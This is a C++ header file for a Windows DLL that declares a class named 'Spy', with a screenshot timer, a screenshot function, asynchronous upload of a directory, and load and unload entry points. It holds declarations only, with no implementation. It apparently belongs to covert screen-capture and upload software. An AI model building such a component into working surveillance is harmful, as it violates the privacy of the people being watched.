#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <stdlib.h>
#include "../../log-cpp/log.h"
#include "cfg.h"

#define EXPORT __declspec(dllexport)
#define ADD_FLAG(state, flag) {state |= flag;}
#define REM_FLAG(state, flag) {state &= ~flag;}
#define HAS_FLAG(state, flag) ((state & flag) == flag)
#define SAFE_FREE(ptr) {if (ptr != NULL) {delete ptr; ptr = NULL;}}

/* just using _strdup instead of strdup, ignore warning :| I don't know why this warning is happening */
#define strdup _strdup
#define itoa _itoa

typedef unsigned char byte;

class Timer;

class Spy
{
	static HANDLE mutex;
	static Timer * scrot_timer;
	static void lock();
	static void unlock();
	static void get_temp_fname(char * buffer, int l);
	static void path_combine(char * dst, const char * dir, const char * fname);
	static DWORD upload_async(LPVOID * dir_path);
	static void take_screenshot();
public:
	static DWORD load(HINSTANCE hinstance);
	static void unload();
	static void get_temp_fpath(char * buffer, const char * fname = NULL);
	static void notify_upload();
};